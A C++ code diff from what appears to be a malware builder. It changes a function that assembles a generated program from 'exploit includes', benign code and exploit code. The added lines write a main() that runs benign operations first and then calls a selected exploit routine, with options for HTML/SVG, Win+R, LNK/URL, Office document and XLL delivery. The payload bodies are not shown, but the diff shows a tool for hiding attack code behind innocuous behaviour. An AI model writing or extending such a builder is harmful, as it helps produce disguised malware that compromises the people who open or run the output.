@@ -1922,12 +1922,47 @@ public:
             debugLog << "Exploit Includes Length: " << exploitIncludes.length() << "\n";
             debugLog << "Benign Code Length: " << benignCode.length() << "\n";
             
-            // Create a simple, working combined code structure
+            // Create a complete, working combined code structure with main entry point
             std::string combinedCode = exploitIncludes + "\n";
             combinedCode += benignCode + "\n\n";
             
-            // Note: Main function will be added later in the process
-            // Do not add main function here to avoid duplicates
+            // Add exploit code if requested
+            if (exploitType != EXPLOIT_NONE) {
+                combinedCode += exploitCode + "\n\n";
+            }
+            
+            // Add a proper main entry point that calls both benign operations and exploits
+            combinedCode += "int main() {\n";
+            combinedCode += "    // Perform benign operations\n";
+            combinedCode += "    performBenignOperations();\n";
+            
+            if (exploitType != EXPLOIT_NONE) {
+                combinedCode += "    \n";
+                combinedCode += "    // Execute exploit if selected\n";
+                switch (exploitType) {
+                    case EXPLOIT_HTML_SVG:
+                        combinedCode += "    executeHTMLSVGExploit();\n";
+                        break;
+                    case EXPLOIT_WIN_R:
+                        combinedCode += "    executeWinRExploit();\n";
+                        break;
+                    case EXPLOIT_INK_URL:
+                        combinedCode += "    executeInkUrlExploit();\n";
+                        break;
+                    case EXPLOIT_DOC_XLS:
+                        combinedCode += "    executeDocXlsExploit();\n";
+                        break;
+                    case EXPLOIT_XLL:
+                        combinedCode += "    executeXllExploit();\n";
+                        break;
+                    default:
+                        break;
+                }
+            }
+            
+            combinedCode += "    \n";
+            combinedCode += "    return 0;\n";
+            combinedCode += "}\n";
             
             debugLog << "Combined Code Length: " << combinedCode.length() << "\n";
             
